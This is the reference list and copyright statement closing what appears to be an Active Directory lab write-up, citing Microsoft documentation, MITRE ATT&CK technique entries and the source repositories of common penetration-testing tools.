4. **Microsoft Learn.** Active Directory Domain Services, security descriptors, Group Policy, Kerberos and PowerShell remoting documentation. https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/
5. **MITRE ATT&CK.** Techniques relating to LLMNR/NBT-NS poisoning (T1557.001), password spraying (T1110.003), Kerberoasting (T1558.003) and DCSync (T1003.006). https://attack.mitre.org/
6. **Tool documentation.** Responder (lgandx/Responder), Impacket (fortra/impacket), Kerbrute (ropnop/kerbrute), NetExec (Pennyw0rth/NetExec) and BloodHound (SpecterOps) maintained source repositories.

**Copyright/credit statement:** This write-up is an original synthesis of user-provided lab output, independently worded explanations and cited reference methods. Public write-ups have not been reproduced verbatim; external screenshots are not relabeled as personal captures. The uploaded screenshots remain linked to their original evidence identifiers.
